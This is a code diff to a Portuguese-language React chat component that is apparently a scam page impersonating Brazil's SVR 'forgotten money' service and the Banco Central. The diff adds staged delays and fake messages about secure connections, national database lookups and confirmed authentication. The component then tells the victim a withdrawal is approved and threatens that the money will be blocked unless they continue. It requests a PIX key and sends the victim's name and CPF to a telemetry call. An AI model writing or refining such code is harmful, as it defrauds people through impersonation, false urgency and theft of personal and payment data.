@@ -69,6 +69,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
          }).catch(console.error);
       };
 
+      const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
       try {
         const res = await axios.get(`${API_URL}/api/config`);
         if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
@@ -76,8 +78,15 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         console.error("Config fetch failed", e);
       }
 
-      setTyping(true);
       try {
+        setTyping(true);
+        await sleep(1500);
+        setTyping(false);
+        addBotMessage("Iniciando conexão segura com o Sistema de Valores a Receber (SVR)...");
+
+        await sleep(1500);
+        setTyping(true);
+        
         const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
            docType: data.docType,
            docValue: data.docValue
@@ -92,36 +101,41 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         
         sendTelemetry("entered", name, formattedVal);
 
+        await sleep(2000);
+        setTyping(false);
+        addBotMessage(`Consultando base de dados nacional para o ${data.docType.toUpperCase()}: ${data.docValue}...`);
+        
+        await sleep(2000);
+        setTyping(true);
+        await sleep(3000);
+        setTyping(false);
+        addBotMessage(`Autenticação confirmada em nome de: ${name}. Buscando histórico de contas vinculadas e saldos inativos...`);
+
+        await sleep(2500);
+        setTyping(true);
+        await sleep(3500);
         setTyping(false);
         addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
         
-        // Show second message (Video explicativo se houver)
-        setTimeout(() => {
-          setTyping(true);
-          setTimeout(() => {
-            setTyping(false);
-            addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
-            
-            // Show third message
-            setTimeout(() => {
-              setTyping(true);
-              setTimeout(() => {
-                setTyping(false);
-                addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
-                
-                // Show fourth message
-                setTimeout(() => {
-                  setTyping(true);
-                  setTimeout(() => {
-                    setTyping(false);
-                    addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
-                    setAwaitingPix(true);
-                  }, 1500);
-                }, 2000);
-              }, 2500);
-            }, 2500);
-          }, 2000);
-        }, 2000);
+        await sleep(4000);
+        setTyping(true);
+        await sleep(3000);
+        setTyping(false);
+        addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
+        
+        await sleep(4000);
+        setTyping(true);
+        await sleep(5000);
+        setTyping(false);
+        addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
+        
+        await sleep(5000);
+        setTyping(true);
+        await sleep(3500);
+        setTyping(false);
+        addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+        setAwaitingPix(true);
+
       } catch (e) {
         setTyping(false);
         addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
